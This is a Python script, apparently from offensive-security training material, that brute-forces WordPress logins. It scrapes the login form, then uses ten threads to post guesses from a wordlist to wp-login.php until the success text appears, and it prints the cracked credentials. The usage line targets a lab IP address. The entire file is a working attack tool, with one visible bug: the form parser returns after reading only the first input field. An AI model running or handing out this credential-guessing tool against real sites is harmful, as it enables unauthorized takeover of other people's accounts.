from io import BytesIO
from lxml import etree
from queue import Queue
import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
WORDLIST = sys.argv[2]
AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0"


def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):  # find all input elements
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
        return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        headers = {'User-Agent': AGENT}
        session = requests.Session()
        resp0 = session.get(self.url, headers=headers)
        params = get_params(resp0.content)
        params['log'] = self.username
        while not passwords.empty() and not self.found:

            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd
            resp1 = session.post(self.url, data=params, headers=headers)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd)
                print('done: now cleaning up other threads. . .')


if __name__ == "__main__":
    if len(sys.argv) == 4:
        words = get_words()
        url = sys.argv[1]
        b = Bruter(sys.argv[3], url)
        b.run_bruteforce(words)
    else:
        print("Please specify url username and password")
        print("For Example: python3 wordpressBruter.py http://10.10.87.217/wp-login.php wordlist.txt username")
